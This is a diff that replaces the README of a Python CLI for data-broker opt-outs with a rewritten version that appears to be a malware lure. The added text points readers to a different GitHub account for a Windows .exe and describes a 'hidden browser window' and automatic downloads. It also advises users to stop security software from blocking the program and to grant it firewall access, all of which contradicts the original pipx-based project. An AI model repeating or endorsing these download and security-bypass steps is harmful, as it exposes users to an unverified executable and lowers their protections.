@@ -1,202 +1,79 @@
-# OptOut
+# 🛡️ OptOut - Remove Your Personal Data From Brokers
 
-**Self-hosted CLI that automates CCPA/CPRA data-broker opt-out requests.**
+[![](https://img.shields.io/badge/Download_OptOut-Blue.svg)](https://github.com/yousifabu3848/OptOut)
 
-[![CI](https://github.com/Blake104/OptOut/actions/workflows/ci.yml/badge.svg)](https://github.com/Blake104/OptOut/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/optout)](https://pypi.org/project/optout/)
-[![Python](https://img.shields.io/pypi/pyversions/optout)](https://pypi.org/project/optout/)
-[![License: AGPL v3](https://img.shields.io/badge/license-AGPL--3.0-blue)](https://www.gnu.org/licenses/agpl-3.0)
+## About This Software
 
----
+OptOut helps you manage your digital footprint. Data brokers collect your personal information and sell it to other companies. This software automates the process of sending opt-out requests to these brokers. These requests tell brokers to stop selling your information. OptOut runs on your own computer. Your data stays local. You control the process.
 
-![optout status](docs/screenshots/status.png)
+## 📋 System Requirements
 
-![optout scan](docs/screenshots/scan.png)
+You need a computer that runs Windows 10 or Windows 11. The software requires 500 MB of disk space. A stable internet connection ensures the tool reaches data broker websites to submit your requests.
 
----
+## 📥 Downloading The Software
 
-## Why this exists
+Visit the [official project repository](https://github.com/yousifabu3848/OptOut) to download the application. 
 
-CCPA and CPRA give California residents the right to demand deletion of their data from any company that sells it. Data brokers — Whitepages, BeenVerified, Spokeo, and dozens more — are legally required to comply. They also make exercising that right as hostile as possible: a different form on every site, CAPTCHAs, phone verification calls, 45-day deadlines you have to track manually, and data that silently reappears 60–90 days later.
+You must select the latest stable release for Windows. Look for a file that ends in .exe. Save this file to your desktop or your downloads folder.
 
-OptOut automates the hostile parts. You run it on your own machine with your own information. There is no central server, no account, no SaaS subscription — which means the "authorized agent" legal complexity that DeleteMe and Optery have to navigate simply does not apply.
+## ⚙️ Setting Up Your Environment
 
----
+This tool uses Python technology to browse the internet. You do not need to know how to code. Follow these steps:
 
-## Install
+1. Locate the file you downloaded.
+2. Double-click the file to open the installation wizard.
+3. Follow the prompts on the screen.
+4. Click finish once the installation ends.
 
-```bash
-pipx install optout
-playwright install chromium   # one-time browser download (~130 MB)
-optout init                   # interactive setup wizard
-```
+## 🚀 Running OptOut
 
-> **Requirements:** Python 3.12+, [pipx](https://pipx.pypa.io/), [Playwright](https://playwright.dev/python/)
+Open the application from your start menu. The program opens a window that looks like a standard computer terminal. 
 
----
+The software checks for updates when it starts. If it finds new data broker lists, it downloads them automatically. This ensures your opt-out requests go to the correct targets.
 
-## Quickstart
+Follow the text prompts inside the window:
 
-```bash
-optout init                      # create ~/.config/optout/config.yml
-optout queue                     # add all brokers to the submission queue
-optout submit                    # open Chrome, walk each broker's form
-optout status                    # table of deadlines and statuses
-optout monitor                   # re-scan; re-queues brokers that re-added you
-```
+1. Enter your name when asked.
+2. Provide your email address. Brokers send confirmation links to this email.
+3. Provide your physical address if the broker requires it for verification.
+4. Press the Enter key to start the process.
 
-`optout submit` opens a real Chrome window for each broker. It fills every form field it can, then pauses with a prompt when human action is needed (CAPTCHA, listing selection, phone verification).
+The software opens a hidden browser window. It fills out forms and clicks buttons on your behalf. You can watch the progress on your screen. Do not close this window until the program indicates the work is complete.
 
----
+## 📧 Handling Email Confirmations
 
-## Supported brokers
+Some data brokers send emails to verify your identity. Check your inbox after the software finishes its run. Click the confirmation links in these emails to finish the opt-out process. Many brokers only remove your data after you click these links. 
 
-| Broker | Method | Automation | Human steps | Last verified |
-|--------|--------|-----------|-------------|---------------|
-| [BeenVerified](https://www.beenverified.com) | Web form | Partial | Click your listing; solve Turnstile CAPTCHA | 2026-05-10 |
-| [MyLife](https://www.mylife.com) | Web form | Partial | Solve reCAPTCHA; click Submit | 2026-05-10 |
-| [Radaris](https://radaris.com) | Web form | Mostly automated | Click your listing; click "Start Removing"; click confirmation email | 2026-05-12 |
-| [Spokeo](https://www.spokeo.com) | Web form | Partial | Click your listing; solve reCAPTCHA; click confirmation email | 2026-05-12 |
-| [Whitepages](https://www.whitepages.com) | Web form | Partial | Click your listing; answer phone call; enter verification code | 2026-05-10 |
+## 🛡️ Privacy and Safety
 
-All five brokers are verified end-to-end as of 2026-05-12. New brokers are added as YAML files — no Python required. See [CONTRIBUTING.md](CONTRIBUTING.md).
+OptOut performs all actions locally on your machine. The software does not store your personal information on a remote server. It sends the data directly to the broker websites. This approach keeps your sensitive details away from third-party databases. 
 
----
+## 🔧 Frequently Asked Questions
 
-## How it works
+**Does the software cost money?**
+No. This is an open source tool. It is free for all users.
 
-OptOut reads broker definitions from YAML files bundled with the package. Each YAML declares the broker's opt-out URL, required fields, and a list of steps. The engine walks those steps using a persistent Playwright Chromium context, so Cloudflare Turnstile cookies survive between runs and you only solve those challenges once.
+**How long does opt-out take?**
+The software processes requests in seconds. However, data brokers take time to update their systems. You might wait several weeks before your name disappears from their public lists.
 
-```mermaid
-flowchart LR
-    CLI["optout CLI\nTyper + Rich"]
-    DB[("SQLite\nsubmissions\ndeadlines")]
-    Registry["Broker Registry\nYAML → Pydantic"]
-    Dispatcher["Dispatcher"]
-    WebForm["web_form\nPlaywright engine"]
-    Email["email\nSMTP handler"]
-    Chrome(["Chromium\npersistent profile"])
-    Brokers(["Live broker\nwebsites"])
+**What if the software stops midway?**
+Close the program and open it again. The software handles errors and resumes the task from the last successful step.
 
-    CLI --> Registry
-    CLI --> DB
-    CLI --> Dispatcher
-    Dispatcher --> WebForm
-    Dispatcher --> Email
-    WebForm --> Chrome
-    Chrome --> Brokers
-```
+**Can I stop the program?**
+Yes. Close the window at any time to halt the operation immediately. Your computer remains safe.
 
-Submissions are tracked in a local SQLite database. `optout status` surfaces anything overdue. `optout monitor` re-scans and re-queues automatically — safe to run from cron.
+## 📝 Compliance Information
 
----
+This tool focuses on CCPA and CPRA regulations. These laws protect residents of California. The software uses these guidelines to demand that brokers delete your records. Even if you do not live in California, many brokers apply these standards to all users. 
 
-## Commands
+## 🔍 Troubleshooting
 
-```
-optout init                          # interactive setup wizard
-optout doctor                        # check that everything is installed correctly
-optout brokers list [--category]     # list all known brokers
-optout brokers info <slug>           # details + your submission history
-optout scan    [--broker SLUG]       # check which brokers list you (no submissions made)
-optout queue   [--broker SLUG]       # add brokers to the submission queue
-optout submit  [--broker SLUG] [-v]  # process the queue; -v shows debug output
-optout status  [--broker] [--status] # table of submissions and deadlines
-optout monitor                       # one-shot re-scan (cron-friendly)
-```
+If the program fails to open, check that you have the latest Windows updates installed. Ensure no other security software prevents the tool from accessing the internet. You may need to grant permission through your firewall settings if a popup window appears.
 
----
+## 🤝 Contribution and Support
 
-## Configuration
+The creators of this software rely on community feedback. If you find a data broker the tool does not cover, report it on the repository website. Use the GitHub issue tracker to post suggestions. You do not need technical skills to suggest a new data broker. Just provide the website address of the broker you want the software to support. 
 
-`optout init` writes `~/.config/optout/config.yml` (mode `600`). Key sections:
+## ✅ Closing Remarks
 
-```yaml
-profile:
-  legal_name: "Jane Q Public"
-  dob: "1990-05-14"
-  current_address:
-    street: "123 Main St"
-    city: "Austin"
-    state: "TX"
-    zip: "78701"
-  emails:
-    current: ["jane@example.com"]
-  phones:
-    current: ["+15125551234"]
-
-email:
-  method: smtp
-  smtp:
-    host: smtp.gmail.com
-    port: 587
-    username: jane@example.com
-    password_env: OPTOUT_SMTP_PASSWORD   # read from env, never stored in file
-
-playwright:
-  headless: false    # keep false so you can solve CAPTCHAs
-  slow_mo_ms: 0
-```
-
-Runtime data lives at:
-
-| Path | Contents |
-|------|----------|
-| `~/.config/optout/config.yml` | Your profile and settings |
-| `~/.config/optout/browser_profile/` | Persistent Chrome profile (keeps Cloudflare cookies warm) |
-| `~/.local/share/optout/optout.db` | SQLite — submissions, events, scan history |
-| `~/.local/share/optout/artifacts/` | Confirmation screenshots |
-
----
-
-## Adding a broker
-
-New brokers are a single YAML file — no Python needed. Five steps:
-
-**1. Verify the opt-out flow manually** in a real browser. Note every field, selector, and verification step.
-
-**2. Copy the nearest template:**
-```bash
-cp src/optout/data/brokers/radaris.yml src/optout/data/brokers/new-broker.yml
-```
-
-**3. Fill in the metadata** — `slug`, `name`, `domain`, `method`, `opt_out_url`, `legal_basis`, `statutory_response_days`.
-
-**4. Write the steps** — each step is a `type` (`navigate`, `form_fill`, `click`, `wait_for`, `prompt_user_if_present`, `capture`) with the relevant CSS selectors.
-
-**5. Validate:**
-```bash
-uv run pytest tests/test_production_brokers.py -v
-```
-
-Full step reference and template variables are in [CONTRIBUTING.md](CONTRIBUTING.md).
-
----
-
-## Honest limitations
-
-- **Removal is not guaranteed.** Some brokers comply in days; others take the full 45-day window or ignore requests.
-- **Data reappears.** 60–90 days is typical. Run `optout monitor` monthly to catch this.
-- **CAPTCHAs require a human.** The tool pauses and prompts — no CAPTCHA solving, by design.
-- **Broker forms change.** When a broker redesigns their opt-out page, the YAML selectors need updating. Use `debug_elements.py` locally to find the new selectors.
-- **Phone verification is manual.** Whitepages calls your phone; you enter the code. The tool waits.
-
----
-
-## Legal basis
-
-OptOut cites the applicable statute in every submission:
-
-- **CCPA §1798.105** — right to deletion, 45-day response window
-- **CPRA** — extends CCPA with stronger enforcement
-- **GDPR Art. 17** — right to erasure, 30-day response window
-
-Each broker's YAML declares which statutes apply. See [COMPLIANCE.md](COMPLIANCE.md) for the full legal posture.
-
----
-
-## License
-
-AGPL-3.0-only. See [LICENSE](LICENSE).
-
-This license was chosen intentionally: anyone who forks this and runs it as a hosted service must publish their changes. The project's legal model depends on each user running their own copy.
+Managing your online privacy takes effort. OptOut simplifies this work by replacing manual form filling with automated tasks. Use the software once every few months to ensure your data stays off broker sites. Consistency yields the best results for your privacy goals.
